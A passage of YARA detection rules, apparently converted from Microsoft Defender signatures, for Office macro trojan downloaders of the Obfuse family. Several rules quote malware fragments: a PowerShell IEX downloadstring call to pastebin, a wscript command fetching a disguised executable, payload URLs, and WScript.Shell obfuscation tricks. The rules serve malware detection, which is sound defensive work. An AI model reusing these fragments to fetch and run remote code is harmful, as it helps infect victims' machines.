        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-16] 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = ".ShellExecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NW_2147743664_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NW!MTB"
        threat_id = "2147743664"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "HyperX = HyperX + 0." ascii //weight: 1
        $x_1_2 = "NGpower = NGpower - 0." ascii //weight: 1
        $x_1_3 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c [0-64] 2e 62 61 74 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".WriteLine (\"pow^\")" ascii //weight: 1
        $x_1_5 = ".WriteLine (\"e^\")" ascii //weight: 1
        $x_1_6 = ".WriteLine (\"x^\")" ascii //weight: 1
        $x_1_7 = "* Lite)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NY_2147743666_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NY!MTB"
        threat_id = "2147743666"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 22 [0-53] 77 69 [0-16] 6e [0-32] 6d 67 6d [0-16] 74 73 3a [0-32] 57 [0-16] 69 6e 33 32 [0-16] 5f 50 [0-53] 72 6f [0-16] 63 65 [0-16] 73 73 [0-32] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 22 [0-32] 77 [0-53] 69 [0-32] 6e [0-32] 6d 67 6d [0-16] 74 73 3a [0-32] 57 [0-16] 69 6e 33 32 [0-16] 5f 50 [0-32] 72 6f [0-16] 63 65 [0-32] 73 73 [0-32] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 22 [0-53] 77 [0-53] 69 [0-16] 6e [0-16] 6d 67 6d [0-16] 74 73 3a [0-32] 57 [0-32] 69 6e 33 32 [0-16] 5f 50 [0-53] 72 6f [0-16] 63 65 [0-53] 73 [0-53] 73 [0-53] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 22 [0-53] 77 [0-53] 69 [0-16] 6e [0-16] 6d [0-32] 67 6d [0-16] 74 73 3a [0-32] 57 [0-16] 69 6e [0-16] 33 32 [0-16] 5f 50 [0-53] 72 6f [0-16] 63 65 [0-53] 73 [0-32] 73 [0-53] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 28 [0-56] 28 22 70 22}  //weight: 1, accuracy: Low
        $x_1_6 = ", MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NT_2147743701_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NT!MTB"
        threat_id = "2147743701"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-32] 20 26 20 22 5c [0-32] 2e 78 73 22 20 26 20 [0-32] 28 29 2c 20 31 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= Chr(\"&h\" & Mid(" ascii //weight: 1
        $x_1_3 = "\"tmp\"" ascii //weight: 1
        $x_1_4 = "= \"\"" ascii //weight: 1
        $x_1_5 = ".Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AD_2147743847_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AD!MSR"
        threat_id = "2147743847"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = {44 69 6d 20 [0-9] 20 41 73 20 53 74 72 69 6e 67}  //weight: 1, accuracy: Low
        $x_1_3 = "powershell.exe \"\"IEX ((new-object net.webclient)" ascii //weight: 1
        $x_1_4 = ".downloadstring('https://pastebin.com/raw/" ascii //weight: 1
        $x_1_5 = {53 68 65 6c 6c 20 28 [0-6] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AD_2147743847_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AD!MSR"
        threat_id = "2147743847"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 [0-21] 22 29 2e 43 72 65 61 74 65 45 6c 65 6d 65 6e 74 28 22 [0-21] 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4b 69 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= Process.Create(Cipher(FromBase64(" ascii //weight: 1
        $x_1_4 = {50 72 6f 63 65 73 73 2e 43 72 65 61 74 65 28 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-16] 2e 65 78 65 22 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AE_2147743848_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AE!MSR"
        threat_id = "2147743848"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {59 6f 75 20 61 72 65 20 68 61 63 6b 65 64 22 2c 20 [0-16] 2c 20 22 59 6f 75 20 61 72 65 20 68 61 63 6b 65 64}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 22 43 3a 5c 77 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 63 61 6c 63 2e 65 78 65 [0-6] 76 62 4d 61 78 69 6d 69 7a 65 64 46 6f 63 75 73}  //weight: 1, accuracy: Low
        $x_1_3 = "Set IEapp = CreateObject(\"InternetExplorer.Application\") 'Set IEapp = InternetExplorer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OE_2147743879_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OE!MTB"
        threat_id = "2147743879"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "HyperX = HyperX + 0." ascii //weight: 1
        $x_1_2 = "Selection.TypeText Text:=\"" ascii //weight: 1
        $x_1_3 = {22 63 3a 5c [0-32] 2e 62 61 74 22 2c 20 54 72 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = "* Fix(" ascii //weight: 1
        $x_1_5 = "* Lite)" ascii //weight: 1
        $x_1_6 = "& \"|\" & B & \"|\" &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OL_2147743947_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OL!MTB"
        threat_id = "2147743947"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-37] 29 20 53 74 65 70 20 31}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"4c\"" ascii //weight: 1
        $x_1_4 = "& \"4f\" &" ascii //weight: 1
        $x_1_5 = "= Fix(" ascii //weight: 1
        $x_1_6 = "= IsNull(\"\")" ascii //weight: 1
        $x_1_7 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OP_2147743984_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OP!MTB"
        threat_id = "2147743984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"https://monicapecere.it/N6NwQHR9RIPo3pF.exe\"" ascii //weight: 1
        $x_1_2 = ".Open Devlp, Downloadimage_URL, False, \"username\", \"password" ascii //weight: 1
        $x_1_3 = ".SaveToFile (\"Server.gif\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OP_2147743984_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OP!MTB"
        threat_id = "2147743984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "asmbyte = asmbyte + 0." ascii //weight: 1
        $x_1_2 = "* Fix(" ascii //weight: 1
        $x_1_3 = "* T)" ascii //weight: 1
        $x_1_4 = "& \"|\" & B & \"|\"" ascii //weight: 1
        $x_1_5 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 43 3a 5c [0-48] 2e 62 61 74 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_6 = {26 20 22 36 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 32 30 31 39 2f 30 37 2f [0-16] 2e 65 78 65 20 43 3a 5c [0-48] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OP_2147743984_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OP!MTB"
        threat_id = "2147743984"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print G8wz5k8tQ0du8B" ascii //weight: 1
        $x_1_2 = "CLng((2.10729613733906 * 466))" ascii //weight: 1
        $x_1_3 = "wdBulgarian" ascii //weight: 1
        $x_1_4 = "(-482 - wdTexture25Percent)" ascii //weight: 1
        $x_1_5 = "Chr(CLng((AscW(\"i\")" ascii //weight: 1
        $x_1_6 = "Close #CLng((wdJustificationModeCompress Xor wdSectionDirectionRtl))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OR_2147744021_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OR!MTB"
        threat_id = "2147744021"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 20 [0-64] 28 53 68 65 65 74 73 28 22 [0-20] 22 29 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65 2c 20 [0-2] 29 2c 20 30 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = "= Chr(Int(0" ascii //weight: 1
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-64] 28 22 [0-48] 22 2c 20 [0-2] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4d 69 64 28 [0-56] 2c 20 [0-56] 2c 20 32 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-64] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_6 = {26 20 43 68 72 28 [0-64] 20 2d 20 [0-64] 29 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_OY_2147744147_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.OY!MTB"
        threat_id = "2147744147"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 50 4f 50 4f 54 41 4d 49 4b 55 53 45 20 3d 20 4f 50 4f 50 4f 54 41 4d 49 4b 55 53 45 20 2b 20 [0-21] 20 2a 20 49 6e 74 28 [0-21] 20 2b 20 [0-21] 20 2a 20 4c 69 74 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 61 20 3d 20 66 73 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c [0-48] 2e 62 61 74 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 22 [0-18] 2e 65 78 65 5e 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= L & \"|\" & B & \"|\" & R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147744180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MTB"
        threat_id = "2147744180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".SaveToFile (\"C:\\users\\public\\wf.dat\")" ascii //weight: 1
        $x_1_2 = ".Open \"GET\", \"http://" ascii //weight: 1
        $x_1_3 = "longlive.casa/p1cture3.jpg" ascii //weight: 1
        $x_1_4 = ".Run \"\" & (RequestArgument + \"32" ascii //weight: 1
        $x_1_5 = "Application.Run \"Gtys\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147744180_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MTB"
        threat_id = "2147744180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"W\" + \"Sc\" + \"ri\" + \"pt\" + \"\" + \".\" + \"Sh\" + \"el\" + \"\" + \"l\")" ascii //weight: 1
        $x_1_2 = "Pl\" + \"\" + \"ay\" + \"\" + \"Li\" + \"st\" + \"\" + \".\" + \"v\" + \"\" + \"bs" ascii //weight: 1
        $x_1_3 = ".Run(\"ws\" + \"\" + \"cr\" + \"ip\" + \"\" + \"t\" + \".\" + \"\" + \"ex\" + \"e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147744180_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MTB"
        threat_id = "2147744180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RexCold = Replace(f, \"x\", \"\")" ascii //weight: 1
        $x_1_2 = "RexCold2 = Replace(f, \"i\", \"\")" ascii //weight: 1
        $x_1_3 = "= CallByName(CreateObject(\"W\" & \"Scri\" & RexCold2(\"piti.Sihelli\")), RexCold2(\"Ruin\"), 1, RikP0, 1)" ascii //weight: 1
        $x_1_4 = "Application.StartupPath & RexCold(\"xxx\\xx.x.x\\.x.xx\\x\") & RexCold(\"jxSnOfdd.tovco.\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147744180_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MTB"
        threat_id = "2147744180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pyvjHfGNT = pyvjHfGNT + 0.05046294199 * Sgn(4.4778548954 + 52175.8062831484 * OaXvbJJ9I7n)" ascii //weight: 1
        $x_1_2 = "linewhriter.WriteLine (\"wscript //nologo c:\\winlogs\\debug.vbs http://ozcamlibel.com.tr/wp-content/uploads/2019/10/oklcnms.tiff c:\\winlogs\\oly_debug2.exe\")" ascii //weight: 1
        $x_1_3 = "= L & \"|\" & B & \"|\" & R" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PA_2147744180_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PA!MTB"
        threat_id = "2147744180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "VBA.CallByName VBA.CreateObject(Empty + \"W\" + Empty + \"Sc\" & Empty & \"rip\" & \"t.\" &" ascii //weight: 1
        $x_1_2 = "\"R\" & Empty & \"u\" & Empty & Empty & \"\" & \"n\", VbMethod, _" ascii //weight: 1
        $x_1_3 = {3d 20 46 65 72 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-10] 22 20 26 20 45 6d 70 74 79}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 22 20 26 20 [0-10] 20 26 20 45 6d 70 74 79 20 26 20 22 5c [0-10] 2e 22 20 26 20 45 6d 70 74 79 20 26 20 22 63 22 20 26 20 45 6d 70 74 79 20 26 20 22 6d 22 20 26 20 45 6d 70 74 79 20 26 20 22 64 22}  //weight: 1, accuracy: Low
        $x_1_5 = "= Empty & \"s\" & Empty & \"h\" & \"\" & \"\" & \"el\" & \"l\" & Empty" ascii //weight: 1
        $x_1_6 = "Olerr Application.StartupPath" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PD_2147744206_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PD!MTB"
        threat_id = "2147744206"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-37] 29 20 53 74 65 70 20 31}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"9\"" ascii //weight: 1
        $x_1_4 = "& \"4d" ascii //weight: 1
        $x_1_5 = {33 33 33 34 33 33 [0-20] 26}  //weight: 1, accuracy: Low
        $x_1_6 = "& \"5a4" ascii //weight: 1
        $x_1_7 = "= Fix(" ascii //weight: 1
        $x_1_8 = "= IsNull(\"\")" ascii //weight: 1
        $x_1_9 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PD_2147744206_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PD!MTB"
        threat_id = "2147744206"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"temp\") & \"\\~$My_CV~\" & \".\" & \"ex\" & \"e\"" ascii //weight: 1
        $x_1_2 = "Set wshShell = CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_3 = "wshShell.Run fp" ascii //weight: 1
        $x_1_4 = "DM.createElement(\"tmp\")" ascii //weight: 1
        $x_1_5 = "DataType = \"bin.base64\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PF_2147744227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PF!MTB"
        threat_id = "2147744227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = "Shell (var)" ascii //weight: 1
        $x_1_3 = {2e 73 73 6c 62 6c 69 6e 64 61 64 6f 2e 63 6f 6d 2f 3c 00 3d 20 22 6d 73 68 54 41 20 (68 74|68 74 74) 3a 2f 2f 74 72 61 6e 73 76 61 6c 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PF_2147744227_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PF!MTB"
        threat_id = "2147744227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-37] 29 20 53 74 65 70 20}  //weight: 1, accuracy: Low
        $x_1_3 = "& \"4b" ascii //weight: 1
        $x_1_4 = "& \"5" ascii //weight: 1
        $x_1_5 = "& \"7" ascii //weight: 1
        $x_1_6 = "333433" ascii //weight: 1
        $x_1_7 = "= IsNull(\"\")" ascii //weight: 1
        $x_1_8 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PI_2147744345_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PI!MTB"
        threat_id = "2147744345"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 31 20 54 6f 20 4c 65 6e 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-20] 29 2e 56 61 6c 75 65 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 4d 69 64 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 20 [0-80] 2c 20 [0-88] 2c 20 [0-69] 2c 20 4e 75 6c 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 22 [0-118] 22 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = {26 20 4d 69 64 28 22 [0-69] 22 2c 20 [0-56] 29 29 20 2d 20 [0-2] 29 [0-2] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PI_2147744345_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PI!MTB"
        threat_id = "2147744345"
        type = "TrojanDownloader"
